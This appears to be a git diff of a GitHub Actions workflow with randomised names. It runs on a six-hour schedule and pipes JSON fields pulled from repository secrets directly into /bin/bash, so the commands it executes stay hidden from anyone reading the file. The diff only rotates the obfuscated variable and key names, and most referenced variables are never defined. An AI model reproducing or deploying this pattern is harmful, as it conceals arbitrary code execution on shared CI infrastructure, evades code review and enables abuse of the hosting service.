@@ -3,27 +3,24 @@ name: amanniheishui
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-
-jobs:  # 10466
+    - cron: '51 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: amanniheishui
         env:
-          uqpn6646: ${{ secrets.uqpn6646 }}
+          evwu6: ${{ secrets.evwu6 }}
         run: |
-          echo $uqpn6646 | jq -r .fnp0632 | /bin/bash
-          echo $forg18 | jq -r .lgqym6 | /bin/bash
-          echo $mn8064 | jq -r .h9 | /bin/bash
-          echo $xuipi10929 | jq -r .kt45590 | /bin/bash
-          echo $whyl3545 | jq -r .ok1944 | /bin/bash
-          echo $ws4 | jq -r .msxf954 | /bin/bash
-          echo $zfrjz11919 | jq -r .vs5108 | /bin/bash
-          echo $s5 | jq -r .n1254 | /bin/bash
-          echo $suuqq79 | jq -r .p4 | /bin/bash
-          echo $qzxwl459 | jq -r .e2 | /bin/bash
-          echo $bptr0765 | jq -r .turln8 | /bin/bash
-          echo $leswt19936 | jq -r .rowe4 | /bin/bash
+          echo $evwu6 | jq -r .w491 | /bin/bash
+          echo $l3 | jq -r .yzz78 | /bin/bash
+          echo $vxjlk01 | jq -r .nq7595 | /bin/bash
+          echo $l72233 | jq -r .qvnd8 | /bin/bash
+          echo $by027 | jq -r .x047 | /bin/bash
+          echo $df96 | jq -r .qsymc867 | /bin/bash
+          echo $ptsqz1869 | jq -r .vv9 | /bin/bash
+          echo $vwglf7764 | jq -r .uobpf472 | /bin/bash
+          echo $eg0 | jq -r .gyms19571 | /bin/bash
+          echo $dncd15 | jq -r .cl27287 | /bin/bash
 
